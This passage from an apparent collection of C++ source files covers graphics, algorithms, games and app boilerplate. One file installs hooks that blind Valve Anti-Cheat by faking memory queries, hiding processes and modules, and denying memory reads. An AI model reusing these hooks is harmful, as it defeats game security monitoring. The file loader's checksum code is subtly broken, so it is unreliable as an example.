pcl::PointCloud<pcl::PointXYZ>::Ptr transformed_cloud(new pcl::PointCloud<pcl::PointXYZ>());\n    // You can either apply transform_1 or transform_2; they are the same\n    pcl::transformPointCloud(*source_cloud, *transformed_cloud, transform_2);\n\n    // Visualization\n    printf(\"\\nPoint cloud colors :  white  = original point cloud\\n\"\n        \"                        red  = transformed point cloud\\n\");\n    pcl::visualization::PCLVisualizer viewer(\"Matrix transformation example\");\n\n    // Define R,G,B colors for the point cloud\n    pcl::visualization::PointCloudColorHandlerCustom<pcl::PointXYZ> source_cloud_color_handler(source_cloud, 255, 255, 255);\n    // We add the point cloud to the viewer and pass the color handler\n    viewer.addPointCloud(source_cloud, source_cloud_color_handler, \"original_cloud\");\n\n    pcl::visualization::PointCloudColorHandlerCustom<pcl::PointXYZ> transformed_cloud_color_handler(transformed_cloud, 230, 20, 20); // Red\n    viewer.addPointCloud(transformed_cloud, transformed_cloud_color_handler, \"transformed_cloud\");\n\n    viewer.addCoordinateSystem(1.0, \"cloud\", 0);\n    viewer.setBackgroundColor(0.05, 0.05, 0.05, 0); // Setting background to a dark grey\n    viewer.setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, \"original_cloud\");\n    viewer.setPointCloudRenderingProperties(pcl::visualization::PCL_VISUALIZER_POINT_SIZE, 2, \"transformed_cloud\");\n    //viewer.setPosition(800, 400); // Setting visualiser window position\n\n    while (!viewer.wasSt",
    "#include <iostream>\r\n#include <vector>\r\n#include <queue>\r\n#include <list>\r\n#include <limits>\r\n\r\nclass Graph\r\n{\r\n    int vertex_count;\r\n    enum Color { WHITE, GRAY, BLACK };\r\n    enum { INFINITY = std::numeric_limits<int>::max() };\r\n\r\n    struct Vertex\r\n    {\r\n        int id;\r\n        int distance;\r\n        Color color;\r\n\r\n        Vertex(int _id) : id(_id),\r\n                          color(Color::WHITE),\r\n                          distance(INFINITY)\r\n        {}\r\n    };\r\n\r\npublic:\r\n    std::vector<Vertex> vertices;\r\n    std::vector<std::list<int>> adjList;\r\n\r\n    Graph(int);\r\n    void addEdge(int, int);\r\n    void breadthFirstSearch(int);\r\n};\r\n\r\nGraph::Graph(int v)\r\n{\r\n    vertex_count = v;\r\n    adjList.resize(vertex_count);\r\n    for (int i = 0; i < vertex_count; i++)\r\n    {\r\n        vertices.push_back(Vertex(i));\r\n    }\r\n}\r\n\r\nvoid Graph::addEdge(int src, int dest)\r\n{\r\n    // undirected graph\r\n    adjList[src].push_back(dest);\r\n    adjList[dest].push_back(src);\r\n}\r\n\r\nvoid Graph::breadthFirstSearch(int s)\r\n{\r\n    vertices[s].color = GRAY;\r\n    vertices[s].distance = 0;\r\n    std::queue<Vertex> q;\r\n    q.push(vertices[s]);\r\n\r\n    while (!q.empty())\r\n    {\r\n        auto u = q.front();\r\n        q.pop();\r\n\r\n        for (const auto &v : adjList[u.id])\r\n        {\r\n            if (vertices[v].color == WHITE)\r\n            {\r\n                vertices[v].color = GRAY;\r\n                vertices[v].distance = u.distance + 1;\r\n                q.push(vertices[v]);\r\n            }\r\n        }\r\n\r\n        u.color = BLACK;\r\n        std::cout << vertices[u.id].id << \" at level \" << vertices[u.id].distance << '\\n';\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    Graph grp(5);\r\n    grp.addEdge(0, 1);\r\n    grp.addEdge(0, 4);\r\n    grp.addEdge(1, 3);\r\n    grp.addEdge(1, 4);\r\n    grp.addEdge(1, 2);\r\n    grp.addEdge(2, 3);\r\n    grp.addEdge(3, 4);\r\n\r\n    grp.breadthFirstSearch(2);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"DataLoadSave.h\"\r\n\r\n\r\nDataLoadSave::DataLoadSave()\r\n:m_seed(777){}\r\n\r\nint DataLoadSave::SaveData(const std::string& filepath, void* data, uint64_t size)\r\n{\r\n\t//Open file for writing in binary mode\r\n\tstd::ofstream file(filepath, std::ios_base::binary | std::ios_base::out);\r\n\t\r\n\t//Check if failed to open file\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Generate a hash\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(data, size);\r\n\r\n\t//Store the hash\r\n\tuint64_t hash = hasher.hash();\r\n\r\n\t//Starting the actual writing of data\r\n\tfile.write((char*)data, size);\r\n\tfile.write((char*)&hash, sizeof(hash));\r\n\r\n\t//Close the file\r\n\tfile.close();\r\n\r\n\t//Return 0 if successful\r\n\treturn SUCCESS;\r\n}\r\n\r\nint DataLoadSave::LoadData(const std::string& filepath, char* src, uint64_t src_size)\r\n{\r\n\t//Open file for Loading data\r\n\tstd::ifstream file(filepath, std::ios_base::binary);\r\n\r\n\t//Check if file is open\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Start by calculating the file size\r\n\tfile.seekg(0, std::ios::end);\r\n\tuint64_t fsize = file.tellg();\r\n\r\n\t//Reset moved file pointer to start again\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\t//if file is empty return -3\r\n\tif (fsize == 0) \r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_EMPTY;\r\n\t}\r\n\r\n\t//Subtract the last 64 bits or 8 bytes of hash to get data struct size\r\n\tuint64_t datasize = fsize - sizeof(uint64_t);\r\n\r\n\tif (datasize > src_size)\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn SRC_SIZE_NOT_SUFFICIENT;\r\n\t}\r\n\r\n\t//Read the file's data into address of src\r\n\tfile.read(src, src_size);\r\n\r\n\t//Read the file checksum stored at the last of the file\r\n\tuint64_t expectedHash = 0;\r\n\tfile.read((char*)&expectedHash, sizeof(expectedHash));\r\n\r\n\t//Generate hash of the read data\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(&src, datasize);\r\n\r\n\t//if checksum doesnt match then file is probably corrupted\r\n\tif (expectedHash != hasher.hash())\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_CORRUPT;\r\n\t}\r\n\r\n\tfile.close();\r\n\treturn SUCCESS;\r\n}\r\n\r\n",
    "#include \"Hooks.h\"\r\n\r\nint _cdecl hkTfn1(HANDLE ProcessHandle, int a2){\r\n\tif (ProcessHandle == GetCurrentProcess())\r\n\t\treturn pFn1(ProcessHandle, a2);\r\n\treturn false;\r\n}\r\n\r\nDWORD _stdcall hkTfn2(HANDLE TargetHandle, int a2, int a3){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn2(TargetHandle, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nbool _cdecl hkTfn3(DWORD dwProcessId, int a2, int a3){\r\n\tif (dwProcessId == GetCurrentProcessId())\r\n\t\treturn pFn3(dwProcessId, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nchar _stdcall hkTfn4(){\r\n\treturn true;\r\n}\r\n\r\nchar _stdcall hkTfn5(char* p_this){\r\n\treturn true;\r\n}\r\n\r\nDWORD* _stdcall hkTfn6(DWORD* p_this){\r\n\treturn p_this;\r\n}\r\n\r\nchar _stdcall hkTfn7(BYTE* p_this, int a2, HANDLE TargetHandle, int a4, int a5, int a6){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn7(p_this, a2, TargetHandle, a4, a5, a6);\r\n\treturn true;\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQuery(LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQueryEx(HANDLE hProcess, LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nBOOL __stdcall hkProcess32NextW(HANDLE hSnapShot, LPPROCESSENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkModule32NextW(HANDLE hSnapShot, LPMODULEENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkIsDebuggerPresent(){\r\n\treturn false;\r\n}\r\n\r\nNTSTATUS hkNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead){\r\n\treturn STATUS_ACCESS_VIOLATION;\r\n}\r\n\r\nbool InitVACHooks(void* DllImageBase) {\r\n\tpFn1 = (tFn1)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 8D 45 F8 C7 45 F8 ? ? ? ?\"), (PBYTE)hkTfn1);\r\n\tpFn2 = (tFn2)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 56 57 6A ? 68 ? ? ? ?\"), (PBYTE)hkTfn2);\r\n\tpFn3 = (tFn3)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 51 56 57 8B 7D 0C\"), (PBYTE)hkTfn3);\r\n\tpFn4 = (tFn4)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 56 8B 35 ? ? ? ?\"), (PBYTE)hkTfn4);\r\n\tpFn5 = (tFn5)DetourFunction((PBYTE)PatternScan(DllImageBase, \"56 57 8B F9 C7 07 ? ? ? ? C7 47 04 ? ? ? ?\"), (PBYTE)hkTfn5);\r\n\tpFn6 = (tFn6)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 56 8B F1 C7 06 ? ? ? ?\"), (PBYTE)hkTfn6);\r\n\tpFn7 = (tFn7)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 8B D9 32 C0\"), (PBYTE)hkTfn7);\r\n\r\n\tHMODULE kernelModule = GetModuleHandleA(\"kernel32.dll\");\r\n\tif (!kernelModule)\r\n\t\treturn false;\r\n\r\n\tpVirtualQuery = (tVirtualQuery)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQuery\"), (PBYTE)hkVirtualQuery);\r\n\tpVirtualQueryEx = (tVirtualQueryEx)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQueryEx\"), (PBYTE)hkVirtualQueryEx);\r\n\tpProcess32NextW = (tProcess32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Process32NextW\"), (PBYTE)hkProcess32NextW);\r\n\tpModule32NextW = (tModule32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Module32NextW\"), (PBYTE)hkModule32NextW);\r\n\tpIsDebuggerPresent = (tIsDebuggerPresent)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"IsDebuggerPresent\"), (PBYTE)hkIsDebuggerPresent);\r\n\tpNtReadVirtualMemory = (tNtReadVirtualMemory)DetourFunction((PBYTE)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtReadVirtualMemory\"), (PBYTE)hkNtReadVirtualMemory);\r\n\r\n\r\n\treturn true;\r\n}\r\n",
    "#include \"Block.h\"\n#include <stdlib.h>\n\nIMAGE* Block::imgs[7] = { NULL, };\nint Block::size = 36;\n\nBlock::Block()\n{\n\tif (imgs[0] == NULL)\n\t{\n\t\tIMAGE imgTmp;\n\t\tloadimage(&imgTmp, \"res/tiles.png\");\n\n\t\tSetWorkingImage(&imgTmp); //\u8fdb\u884c\u5207\u5272\n\t\tfor (int i = 0;i < 7;i++)\n\t\t{\n\t\t\timgs[i] = new IMAGE;\n\t\t\tgetimage(imgs[i], i * size, 0, size, size); //x,y,\u5bbd\uff0c\u9ad8\n\t\t}\n\t\tSetWorkingImage(); //\u6062\u590d\u5de5\u4f5c\u533a\n\t}\n\tint blocks[7][4] =\n\t{\n\t\t1,3,5,7,  //I\n\t\t2,4,5,7,  //Z\n\t\t3,5,4,6,  //Z\n\t\t3,5,4,7,  //T\n\t\t2,3,5,7,  //L\n\t\t3,5,7,6,  //J\n\t\t2,3,4,5,  //\u7530\n\t};\n\n\t//\u968f\u673a\u751f\u6210\u4e00\u79cd\u4fc4\u7f57\u65af\u65b9\u5757\n\tblockType = 1 + rand() % 7;\n\n\t//\u521d\u59cb\u5316 smallBlocks\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tint value = blocks[blockType - 1][i];\n\t\tsmallBlocks[i].row = value / 2;\n\t\tsmallBlocks[i].col = value % 2;\n\t}\n\n\timg = imgs[blockType - 1];\n}\n\nvoid Block::drop()\n{\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tsmallBlocks[i].row++;\n\t}\n}\n\nvoid Block::moveLeftRight(int offset)\n{\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tsmallBlocks[i].col += offset;\n\t}\n}\n\nvoid Block::rotate()\n{\n\tPoint p = smallBlocks[1];\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tPoint tmp = smallBlocks[i];\n\t\tsmallBlocks[i].col = p.col - tmp.row + p.row;\n\t\tsmallBlocks[i].row = p.row + tmp.col - p.col;\n\t}\n}\n\nvoid Block::draw(int leftMargin, int topMargin)\n{\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tint x = leftMargin + smallBlocks[i].col * size;\n\t\tint y = topMargin + smallBlocks[i].row * size;\n\t\tputimage(x, y, img);\n\t}\n}\n\nIMAGE** Block::getImages()\n{\n\treturn imgs;\n}\n\nBlock& Block::operator=(const Block& other)\n{\n\tif (this == &other) return *this;\n\tthis->blockType = other.blockType;\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tthis->smallBlocks[i] = other.smallBlocks[i];\n\t}\n\treturn *this;\n}\n\nbool Block::blockInMap(const vector<vector<int>>& map)\n{\n\tint rows = map.size();\n\tint cols = map[0].size();\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tif (smallBlocks[i].col < 0 || smallBlocks[i].col >= cols ||\n\t\t\tsmallBlocks[i].row < 0 || smallBlocks[i].row >= rows ||\n\t\t\tmap[smallBlocks[i].row][smallBlocks[i].col])\n\t\t\treturn false;\n\t}\n\treturn true;\n}\n\nvoid Block::solidify(vector<vector<int>>& map)\n{\n\tfor (int i = 0;i < 4;i++)\n\t{\n\t\tmap[smallBlocks[i].row][smallBlocks[i].col] = blockType;\n\t}\n}\n\nint Block::getBlockType()\n{\n\treturn blockType;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"kanban_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"SpringJam24PlayerController.h\"\n#include \"GameFramework/Pawn.h\"\n#include \"Blueprint/AIBlueprintHelperLibrary.h\"\n#include \"NiagaraSystem.h\"\n#include \"NiagaraFunctionLibrary.h\"\n#include \"SpringJam24Character.h\"\n#include \"Engine/World.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n\nASpringJam24PlayerController::ASpringJam24PlayerController()\n{\n\tbShowMouseCursor = true;\n\tDefaultMouseCursor = EMouseCursor::Default;\n\tCachedDestination = FVector::ZeroVector;\n\tFollowTime = 0.f;\n\n\tPlayerAbilitySystem = CreateDefaultSubobject<UAbilitySystemComponent>(\"PlayerAbilitySystem\");\n}\n\nvoid ASpringJam24PlayerController::BeginPlay()\n{\n\t// Call the base class  \n\tSuper::BeginPlay();\n\n\t//Add Input Mapping Context\n\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(GetLocalPlayer()))\n\t{\n\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t}\n\n\tPlayerAbilitySystem->InitAbilityActorInfo(this, this);\n}\n\nvoid ASpringJam24PlayerController::SetupInputComponent()\n{\n\t// set up gameplay key bindings\n\tSuper::SetupInputComponent();\n\n\t// Set up action bindings\n\tif (UEnhancedInputComponent* EnhancedInputComponent = CastChecked<UEnhancedInputComponent>(InputComponent))\n\t{\n\t\t// Setup mouse input events\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Started, this, &ASpringJam24PlayerController::OnInputStarted);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Triggered, this, &ASpringJam24PlayerController::OnSetDestinationTriggered);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Completed, this, &ASpringJam24PlayerController::OnSetDestinationReleased);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Canceled, this, &ASpringJam24PlayerController::OnSetDestinationReleased);\n\n\t\t// Setup touch input events\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Started, this, &ASpringJam24PlayerController::OnInputStarted);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Triggered, this, &ASpringJam24PlayerController::OnTouchTriggered);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Completed, this, &ASpringJam24PlayerController::OnTouchReleased);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Canceled, this, &ASpringJam24PlayerController::OnTouchReleased);\n\t}\n}\n\nvoid ASpringJam24PlayerController::OnInputStarted()\n{\n\tStopMovement();\n}\n\n// Triggered every frame when the input is held down\nvoid ASpringJam24PlayerController::OnSetDestinationTriggered()\n{\n\t// We flag that the input is being pressed\n\tFollowTime += GetWorld()->GetDeltaSeconds();\n\t\n\t// We look for the location in the world where the player has pressed the input\n\tFHitResult Hit;\n\tbool bHitSuccessful = false;\n\tif (bIsTouch)\n\t{\n\t\tbHitSuccessful = GetHitResultUnderFinger(ETouchIndex::Touch1, ECollisionChannel::ECC_Visibility, true, Hit);\n\t}\n\telse\n\t{\n\t\tbHitSuccessful = GetHitResultUnderCursor(ECollisionChannel::ECC_Visibility, true, Hit);\n\t}\n\n\t// If we hit a surface, cache the location\n\tif (bHitSuccessful)\n\t{\n\t\tCachedDestination = Hit.Location;\n\t}\n\t\n\t// Move towards mouse pointer or touch\n\tAPawn* ControlledPawn = GetPawn();\n\tif (ControlledPawn != nullptr)\n\t{\n\t\tFVector WorldDirection = (CachedDestination - ControlledPawn->GetActorLocation()).GetSafeNormal();\n\t\tControlledPawn->AddMovementInput(WorldDirection, 1.0, false);\n\t}\n}\n\nvoid ASpringJam24PlayerController::OnSetDestinationReleased()\n{\n\t// If it was a short press\n\tif (FollowTime <= ShortPressThreshold)\n\t{\n\t\t// We move there and spawn some particles\n\t\tUAIBlueprintHelperLibrary::SimpleMoveToLocation(this, CachedDestination);\n\t\tUNiagaraFunctionLibrary::SpawnSystemAtLocation(this, FXCursor, CachedDestination, FRotator::ZeroRotator, FVector(1.f, 1.f, 1.f), true, true, ENCPoolMethod::None, true);\n\t}\n\n\tFollowTime = 0.f;\n}\n\n// Triggered every frame when the input is held down\nvoid ASpringJam24PlayerController::OnTouchTriggered()\n{\n\tbIsTouch = true;\n\tOnSetDestinationTriggered();\n}\n\nvoid ASpringJam24PlayerController::OnTouchReleased()\n{\n\tbIsTouch = false;\n\tOnSetDestinationReleased();\n}\n",
    "// Nguoi du lich\r\n\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint n, a[105][105], X[105], d = 0, ans = INT_MAX, amin = INT_MAX;\r\nbool visited[105];\r\n\r\nvoid Try(int i) {\r\n\tfor(int j=1; j<=n; j++)\r\n\t\tif (visited[j] == 0) {\r\n\t\t\tvisited[j] = 1;\r\n\t\t\tX[i] = j;\r\n\t\t\td += a[X[i - 1]][X[i]];\r\n\t\t\tif (i == n) ans = min(ans, d + a[X[n]][1]);\r\n\t\t\telse if (d + (n - i + 1) * amin < ans) Try(i + 1);\r\n\t\t\tvisited[j] = 0;\r\n\t\t\td -= a[X[i - 1]][X[i]];\r\n\t\t}\r\n}\r\n\r\nint main() {\r\n\tcin >> n;\r\n\tfor (int i = 1; i <= n; i++)\r\n\t\tfor (int j = 1; j <= n; j++) {\r\n\t\t\tcin >> a[i][j];\r\n\t\t\tif (a[i][j] != 0) amin = min(amin, a[i][j]);\r\n\t\t}\r\n\tX[1] = 1;\r\n\tvisited[1] = 1;\r\n\tTry(2);\r\n\tcout << ans;\r\n\r\n}\r\n\r\n/**\r\n11\r\n0 7 83 7 98 95 96 43 19 5 77\r\n7 0 90 91 91 93 85 47 88 29 24\r\n83 90 0 95 44 12 58 32 78 20 51 \r\n7 91 95 0 9 51 45 52 47 49 12\r\n98 91 44 9 0 48 28 18 57 17 67\r\n95 93 12 51 48 0 54 82 40 33 78 \r\n96 85 58 45 28 54 0 55 31 22 100\r\n43 47 32 52 18 82 55 0 66 97 76\r\n19 88 78 47 57 40 31 66 0 58 68 \r\n5 29 20 49 17 33 22 97 58 0 23\r\n77 24 51 12 67 78 100 76 68 23 0\r\n*/",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofSetLineWidth(3);\r\n\tofEnableDepthTest();\r\n\r\n\tthis->frame.setMode(ofPrimitiveMode::OF_PRIMITIVE_LINES);\r\n\r\n\tfor (int radius = 50; radius <= 250; radius += 10) {\r\n\r\n\t\tthis->radius_list.push_back(radius);\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tthis->face.clear();\r\n\tthis->frame.clear();\r\n\r\n\tofSeedRandom(39);\r\n\tglm::vec3 noise_param = glm::vec3(ofRandom(360), ofRandom(360), ofRandom(360));\r\n\r\n\tfor (int i = 0; i < this->radius_list[i]; i++) {\r\n\r\n\t\tauto rotation = glm::vec3(\r\n\t\t\tofMap(ofNoise(noise_param.x, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.y, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.z, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360)\r\n\t\t);\r\n\r\n\t\tthis->setRingToMesh(this->face, this->frame, glm::vec3(), rotation, this->radius_list[i], this->radius_list[i] * 0.1, ofColor(255, 0, 255, 64), ofColor(255, 0, 0));\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateY(ofGetFrameNum() * 1.44);\r\n\r\n\tthis->face.draw();\r\n\tthis->frame.drawWireframe();\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 300;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setRingToMesh(ofMesh& face_target, ofMesh& frame_target, glm::vec3 location, glm::vec3 rotation, float radius, float height, ofColor face_color, ofColor frame_color) {\r\n\r\n\tint index = face_target.getNumVertices();\r\n\r\n\tfor (int deg = 0; deg < 360; deg += 5) {\r\n\r\n\t\tvector<glm::vec3> vertices;\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * 0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * 0.5));\r\n\r\n\t\tfor (auto& vertex : vertices) {\r\n\r\n\t\t\tauto rotation_x = glm::rotate(glm::mat4(), rotation.x * (float)DEG_TO_RAD, glm::vec3(1, 0, 0));\r\n\t\t\tauto rotation_y = glm::rotate(glm::mat4(), rotation.y * (float)DEG_TO_RAD, glm::vec3(0, 1, 0));\r\n\t\t\tauto rotation_z = glm::rotate(glm::mat4(), rotation.z * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\r\n\t\t\tvertex = glm::vec4(vertex, 0) * rotation_y * rotation_x + glm::vec4(location, 0);\r\n\t\t}\r\n\r\n\t\tauto face_index = face_target.getNumVertices();\r\n\t\tface_target.addVertices(vertices);\r\n\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 1); face_target.addIndex(face_index + 2);\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 2); face_target.addIndex(face_index + 3);\r\n\r\n\t\tauto frame_index = frame_target.getNumVertices();\r\n\t\tframe_target.addVertices(vertices);\r\n\r\n\t\tframe_target.addIndex(frame_index + 0); frame_target.addIndex(frame_index + 1);\r\n\t\tframe_target.addIndex(frame_index + 2); frame_target.addIndex(frame_index + 3);\r\n\r\n\t\tfor (int i = 0; i < vertices.size(); i++) {\r\n\r\n\t\t\tface_target.addColor(face_color);\r\n\t\t\tframe_target.addColor(frame_color);\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include <iostream>\n#include <string>\n#include \"roster.h\"\n#include \"degree.h\"\n\nusing namespace std;\n\n\nvoid Roster::parse(string data)\n{\n\t\t//function to parse through studentdata string array\n\t\tsize_t rhs = data.find(\",\");\n\t\tstring studentID = data.substr(0, rhs);\n\n\t\tsize_t lhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tstring firstName = data.substr(lhs, rhs - lhs);\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tstring lastName = data.substr(lhs, rhs - lhs);\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tstring emailAddress = data.substr(lhs, rhs - lhs);\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tint age = stoi(data.substr(lhs, rhs - lhs));\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tint daysInCourse1 = stoi(data.substr(lhs, rhs - lhs));\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tint daysInCourse2 = stoi(data.substr(lhs, rhs - lhs));\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tint daysInCourse3 = stoi(data.substr(lhs, rhs - lhs));\n\n\t\tlhs = rhs + 1;\n\t\trhs = data.find(\",\", lhs);\n\t\tstring strDegreeProgram = data.substr(lhs, rhs - lhs);\n\n\t\tDegreeProgram degreeProgram = DegreeProgram::SOFTWARE;\n\t\tif (strDegreeProgram == \"SOFTWARE\") {\n\t\t\tdegreeProgram = DegreeProgram::SOFTWARE;\n\t\t}\n\t\telse if (strDegreeProgram == \"NETWORK\") {\n\t\t\tdegreeProgram = DegreeProgram::NETWORK;\n\t\t}\n\t\telse if (strDegreeProgram == \"SECURITY\") {\n\t\t\tdegreeProgram = DegreeProgram::SECURITY;\n\t\t}\n\n\t\tadd(studentID, firstName, lastName, emailAddress, age, daysInCourse1, daysInCourse2, daysInCourse3, degreeProgram);\n}\n\nvoid Roster::add(string studentID, string firstName, string lastName, string emailAddress,\n\tint age, int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeprogram) {\n\n\tint daysInCourse[] = { daysInCourse1, daysInCourse2, daysInCourse3 };\n\tclassRosterArray[i] = new Student(studentID, firstName, lastName, emailAddress, age, daysInCourse, 